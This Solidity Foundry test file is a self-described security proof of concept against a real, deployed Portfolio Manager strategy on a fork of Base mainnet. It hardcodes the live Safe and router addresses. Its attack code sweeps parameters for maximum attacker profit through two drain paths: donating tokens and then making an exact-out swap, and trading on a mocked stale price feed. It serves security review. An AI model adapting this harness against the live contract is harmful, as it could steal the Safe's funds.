// SPDX-License-Identifier: LicenseRef-Degensoft-Aqua-Source-1.1
pragma solidity 0.8.30;

/// @custom:license-url https://github.com/1inch/aqua/blob/main/LICENSES/Aqua-Source-1.1.txt

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Aqua} from "aqua/Aqua.sol";
import {ISwapVM} from "swap-vm/interfaces/ISwapVM.sol";
import {MakerTraitsLib} from "swap-vm/libs/MakerTraits.sol";
import {TakerTraitsLib} from "swap-vm/libs/TakerTraits.sol";
import {PortfolioManagerRouter} from "../../src/PortfolioManagerRouter.sol";
import {PortfolioManagerArgsCodec} from "../../src/utils/PortfolioManagerArgsCodec.sol";
import {PortfolioManagerProgramBuilder} from "../../src/utils/PortfolioManagerProgramBuilder.sol";
import {AggregatorV3Interface} from "../../src/interfaces/AggregatorV3Interface.sol";
import {MockTaker} from "../../lib/swap-vm/test/mocks/MockTaker.sol";

/// @notice Security PoC (investigation only, not a fix) against the REAL, currently-deployed
/// Portfolio Manager strategy, on a fork of live Base state. Reconstructs the exact real Order
/// (verified against the known on-chain strategy hash) and attempts two concrete drain paths
/// flagged in review: (1) donate-then-exactOut group-value manipulation, (2) stale-price arb
/// during the 12h on-chain staleness window. Not run in CI; a manual investigation artifact.
contract PMDrainPoCTest is Test {
    address internal constant AQUA_BASE = 0x499943E74FB0cE105688beeE8Ef2ABec5D936d31;
    address internal constant ROUTER = 0x02a11927B0a1c701FEB589Ca86886F4ae1F85f02;
    address internal constant SAFE = 0x0ba288819af70a3AB5496238032C5a8c743D4802;

    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant CBBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant USDT = 0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2;

    address internal constant ETH_USD_FEED = 0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70;
    address internal constant CBBTC_USD_FEED = 0x07DA0E54543a844a80ABE69c8A12F22B3aA59f9D;
    address internal constant USDC_USD_FEED = 0x7e860098F58bBFC8648a4311b374B1D669a2bc6B;
    address internal constant USDT_USD_FEED = 0xf19d560eB8d2ADf07BD6D13ed03e1D11215721F9;

    uint256 internal constant MAX_STALENESS = 12 hours;
    uint32 internal constant LP_FEE_BPS = 200_000;
    uint256 internal constant GROUP_WEIGHT = 0.5e18;

    bytes32 internal constant KNOWN_STRATEGY_HASH = 0x5c8fcd1f952c4dca533108455ecb5a31ec541982972b7e712076642f53cf0fbe;

    Aqua internal aqua;
    PortfolioManagerRouter internal router;
    MockTaker internal taker;
    ISwapVM.Order internal order;

    function setUp() public {
        string memory rpcUrl = vm.envOr("BASE_RPC_URL", string("https://mainnet.base.org"));
        vm.createSelectFork(rpcUrl); // live state -- real Safe balances, real feeds

        aqua = Aqua(AQUA_BASE);
        router = PortfolioManagerRouter(payable(ROUTER));

        PortfolioManagerArgsCodec.Group[] memory groups = new PortfolioManagerArgsCodec.Group[](2);
        groups[0] = _majors();
        groups[1] = _stables();
        bytes memory program = PortfolioManagerProgramBuilder.build(groups, LP_FEE_BPS, 0);

        order = MakerTraitsLib.build(
            MakerTraitsLib.Args({
                maker: SAFE,
                shouldUnwrapWeth: false,
                useAquaInsteadOfSignature: true,
                allowZeroAmountIn: false,
                receiver: address(0),
                hasPreTransferInHook: false,
                hasPostTransferInHook: false,
                hasPreTransferOutHook: false,
                hasPostTransferOutHook: false,
                preTransferInTarget: address(0),
                preTransferInData: "",
                postTransferInTarget: address(0),
                postTransferInData: "",
                preTransferOutTarget: address(0),
                preTransferOutData: "",
                postTransferOutTarget: address(0),
                postTransferOutData: "",
                program: program
            })
        );

        taker = new MockTaker(aqua, router, address(this));
    }

    function _majors() internal pure returns (PortfolioManagerArgsCodec.Group memory) {
        PortfolioManagerArgsCodec.Member[] memory members = new PortfolioManagerArgsCodec.Member[](2);
        members[0] = PortfolioManagerArgsCodec.Member({token: WETH, feed: ETH_USD_FEED, maxStaleness: MAX_STALENESS});
        members[1] = PortfolioManagerArgsCodec.Member({token: CBBTC, feed: CBBTC_USD_FEED, maxStaleness: MAX_STALENESS});
        return PortfolioManagerArgsCodec.Group({weight: GROUP_WEIGHT, members: members});
    }

    function _stables() internal pure returns (PortfolioManagerArgsCodec.Group memory) {
        PortfolioManagerArgsCodec.Member[] memory members = new PortfolioManagerArgsCodec.Member[](2);
        members[0] = PortfolioManagerArgsCodec.Member({token: USDC, feed: USDC_USD_FEED, maxStaleness: MAX_STALENESS});
        members[1] = PortfolioManagerArgsCodec.Member({token: USDT, feed: USDT_USD_FEED, maxStaleness: MAX_STALENESS});
        return PortfolioManagerArgsCodec.Group({weight: GROUP_WEIGHT, members: members});
    }

    /// @dev Sanity check: the reconstructed Order must be byte-identical to the real shipped one.
    function test_ReconstructedOrderMatchesRealShippedStrategyHash() public view {
        assertEq(router.hash(order), KNOWN_STRATEGY_HASH, "reconstructed order must match the real strategy");
    }

    // ===== Finding: donate-then-exactOut group-value manipulation =====

    function test_DonateThenExactOut_DonateCbbtcExtractWeth() public {
        _sweepDonateThenExactOut(CBBTC, USDC, WETH, "donate cbBTC, pay USDC, extract WETH");
    }

    function test_DonateThenExactOut_DonateUsdtExtractUsdc() public {
        _sweepDonateThenExactOut(USDT, WETH, USDC, "donate USDT, pay WETH, extract USDC");
    }

    function test_DonateThenExactOut_DonateWethExtractCbbtc() public {
        _sweepDonateThenExactOut(WETH, USDC, CBBTC, "donate WETH, pay USDC, extract cbBTC");
    }

    /// @dev Sweeps donation size x amountOut request (as a fraction of tokenOut's OWN raw balance,
    /// the binding member-level cap regardless of group-level inflation) and reports the best net
    /// USD profit found for this (donationToken, tokenIn, tokenOut) triple.
    function _sweepDonateThenExactOut(address donationToken, address tokenIn, address tokenOut, string memory label)
        internal
    {
        uint256 tokenOutBalance = IERC20(tokenOut).balanceOf(SAFE);
        console.log("--- %s ---", label);
        console.log("tokenOut raw balance (member cap):", tokenOutBalance);

        int256 bestProfitUsdWad = type(int256).min;
        uint256 bestDonation;
        uint256 bestAmountOut;

        uint256[6] memory outFractionsBps = [uint256(100), 500, 2000, 5000, 8000, 9500]; // 1%..95% of member balance
        uint256[5] memory donationMultiples = [uint256(0), 1, 5, 20, 100]; // x the requested amountOut's own value

        for (uint256 i = 0; i < outFractionsBps.length; i++) {
            uint256 amountOut = (tokenOutBalance * outFractionsBps[i]) / 10_000;
            if (amountOut == 0) continue;

            for (uint256 j = 0; j < donationMultiples.length; j++) {
                uint256 donationAmount = _equivalentAmount(tokenOut, amountOut, donationToken) * donationMultiples[j];

                uint256 snapshot = vm.snapshotState();
                (bool ok, int256 profitUsdWad) =
                    _tryDonateThenExactOut(donationToken, donationAmount, tokenIn, tokenOut, amountOut);
                vm.revertToState(snapshot);

                if (ok && profitUsdWad > bestProfitUsdWad) {
                    bestProfitUsdWad = profitUsdWad;
                    bestDonation = donationAmount;
                    bestAmountOut = amountOut;
                }
            }
        }

        if (bestProfitUsdWad == type(int256).min) {
            console.log("no combination executed successfully in this sweep");
            return;
        }

        console.log("BEST net profit (USD, 1e18):", bestProfitUsdWad);
        console.log("  at donationAmount:", bestDonation);
        console.log("  at amountOut:", bestAmountOut);
    }

    /// @dev One attempt: fund an attacker, donate, exact-out swap, net out USD profit against the
    /// attacker's own real spend (donation + curve amountIn), valued via the real Chainlink feeds.
    function _tryDonateThenExactOut(
        address donationToken,
        uint256 donationAmount,
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) internal returns (bool ok, int256 profitUsdWad) {
        address attacker = address(0xA77AC4E4);
        deal(donationToken, attacker, donationAmount);
        // Over-fund tokenIn generously; unused is swept back out at the end via balance diff.
        uint256 tokenInStash = _equivalentAmount(tokenOut, amountOut * 5, tokenIn) + 1_000_000;
        deal(tokenIn, attacker, tokenInStash);

        vm.startPrank(attacker);
        if (donationAmount > 0) {
            IERC20(donationToken).transfer(SAFE, donationAmount);
        }
        IERC20(tokenIn).transfer(address(taker), tokenInStash);
        vm.stopPrank();

        bytes memory takerData = TakerTraitsLib.build(
            TakerTraitsLib.Args({
                taker: address(taker),
                isExactIn: false,
                shouldUnwrapWeth: false,
                isStrictThresholdAmount: false,
                isFirstTransferFromTaker: false,
                useTransferFromAndAquaPush: false,
                threshold: "",
                to: attacker,
                deadline: 0,
                hasPreTransferInCallback: true,
                hasPreTransferOutCallback: false,
                preTransferInHookData: "",
                postTransferInHookData: "",
                preTransferOutHookData: "",
                postTransferOutHookData: "",
                preTransferInCallbackData: "",
                preTransferOutCallbackData: "",
                instructionsArgs: "",
                signature: ""
            })
        );

        try taker.swap(order, tokenIn, tokenOut, amountOut, takerData) returns (
            uint256 amountIn,
            uint256 /* amountOut */
        ) {
            uint256 valueReceivedUsdWad = _usdValue(tokenOut, amountOut);
            uint256 valueSpentUsdWad = _usdValue(tokenIn, amountIn) + _usdValue(donationToken, donationAmount);
            profitUsdWad = int256(valueReceivedUsdWad) - int256(valueSpentUsdWad);
            ok = true;
        } catch {
            ok = false;
        }
    }

    // ===== Finding: stale-price arbitrage during the 12h on-chain staleness window =====

    /// @notice Demonstrates the contract's only defense against a stale/incorrect price is the
    /// timestamp bound -- it never cross-checks the feed's answer against anything else. Mocks
    /// USDC's real feed to report today's real (pegged, $1) answer at a timestamp just inside the
    /// 12h window, models a hypothetical 10% real-world depeg that the feed hasn't caught up to
    /// yet (a documented real Chainlink behavior: updates are heartbeat/deviation-gated, not
    /// instant), and quantifies the resulting loss to the Safe on a real trade size.
    function test_StalePriceWindow_UsdcDepegNotYetReflected() public {
        (, int256 realAnswer,, uint256 realUpdatedAt,) = AggregatorV3Interface(USDC_USD_FEED).latestRoundData();
        assertGt(realAnswer, 0, "sanity: real feed answer must be positive");
        realUpdatedAt; // silence unused-var warning; kept for clarity of what's being read

        // Keep the feed's own real (pegged) answer, but backdate updatedAt to just inside the 12h
        // window -- the contract accepts this exactly as it would a real stale-but-valid read.
        uint256 staleUpdatedAt = block.timestamp - (MAX_STALENESS - 1 minutes);
        vm.mockCall(
            USDC_USD_FEED,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(uint80(0), realAnswer, uint256(0), staleUpdatedAt, uint80(0))
        );

        uint256 depegBps = 1000; // 10% real-world depeg the stale feed hasn't caught up to

        // Sweep trade size: the tiny live pool means slippage dominates at large sizes, so also
        // check small ones -- a real attacker picks whatever size is actually profitable.
        uint256[6] memory tradeSizesUsdc = [uint256(10_000), 50_000, 200_000, 1_000_000, 3_000_000, 5_000_000];

        for (uint256 i = 0; i < tradeSizesUsdc.length; i++) {
            uint256 snapshot = vm.snapshotState();
            (int256 profitUsdWad, uint256 nominalValueUsdWad, uint256 receivedValueUsdWad) =
                _tryStalePriceTrade(tradeSizesUsdc[i], depegBps);
            console.log("trade size (raw USDC units):", tradeSizesUsdc[i]);
            console.log("  nominal USD paid (contract's belief, 1e18):", nominalValueUsdWad);
            console.log("  WETH USD received (1e18):", receivedValueUsdWad);
            console.log("  attacker net profit vs REAL (depegged) cost (int256, 1e18):", profitUsdWad);
            vm.revertToState(snapshot);
        }
    }

    function _tryStalePriceTrade(uint256 tradeAmountUsdc, uint256 depegBps)
        internal
        returns (int256 profitUsdWad, uint256 nominalValueUsdWad, uint256 receivedValueUsdWad)
    {
        address attacker = address(0xDEFEC7);
        deal(USDC, attacker, tradeAmountUsdc);
        vm.prank(attacker);
        IERC20(USDC).transfer(address(taker), tradeAmountUsdc);

        bytes memory takerData = TakerTraitsLib.build(
            TakerTraitsLib.Args({
                taker: address(taker),
                isExactIn: true,
                shouldUnwrapWeth: false,
                isStrictThresholdAmount: false,
                isFirstTransferFromTaker: false,
                useTransferFromAndAquaPush: false,
                threshold: "",
                to: attacker,
                deadline: 0,
                hasPreTransferInCallback: true,
                hasPreTransferOutCallback: false,
                preTransferInHookData: "",
                postTransferInHookData: "",
                preTransferOutHookData: "",
                postTransferOutHookData: "",
                preTransferInCallbackData: "",
                preTransferOutCallbackData: "",
                instructionsArgs: "",
                signature: ""
            })
        );

        (uint256 amountIn, uint256 amountOut) = taker.swap(order, USDC, WETH, tradeAmountUsdc, takerData);

        nominalValueUsdWad = _usdValue(USDC, amountIn); // what the contract believes it charged
        uint256 realCostUsdWad = (nominalValueUsdWad * (10_000 - depegBps)) / 10_000; // attacker's real spend
        receivedValueUsdWad = _usdValue(WETH, amountOut);
        profitUsdWad = int256(receivedValueUsdWad) - int256(realCostUsdWad);
    }

    // ===== USD valuation helpers (independent of the contract's own accounting) =====

    function _usdValue(address token, uint256 amount) internal view returns (uint256) {
        address feed = _feedFor(token);
        (, int256 answer,,,) = AggregatorV3Interface(feed).latestRoundData();
        uint8 feedDecimals = AggregatorV3Interface(feed).decimals();
        uint8 tokenDecimals = IERC20Metadata(token).decimals();
        return (amount * uint256(answer) * 1e18) / (10 ** feedDecimals) / (10 ** tokenDecimals);
    }

    function _equivalentAmount(address fromToken, uint256 fromAmount, address toToken) internal view returns (uint256) {
        uint256 usdWad = _usdValue(fromToken, fromAmount);
        address feed = _feedFor(toToken);
        (, int256 answer,,,) = AggregatorV3Interface(feed).latestRoundData();
        uint8 feedDecimals = AggregatorV3Interface(feed).decimals();
        uint8 tokenDecimals = IERC20Metadata(toToken).decimals();
        return (usdWad * (10 ** feedDecimals) * (10 ** tokenDecimals)) / uint256(answer) / 1e18;
    }

    function _feedFor(address token) internal pure returns (address) {
        if (token == WETH) return ETH_USD_FEED;
        if (token == CBBTC) return CBBTC_USD_FEED;
        if (token == USDC) return USDC_USD_FEED;
        if (token == USDT) return USDT_USD_FEED;
        revert("unknown token");
    }
}

interface IERC20Metadata {
    function decimals() external view returns (uint8);
}
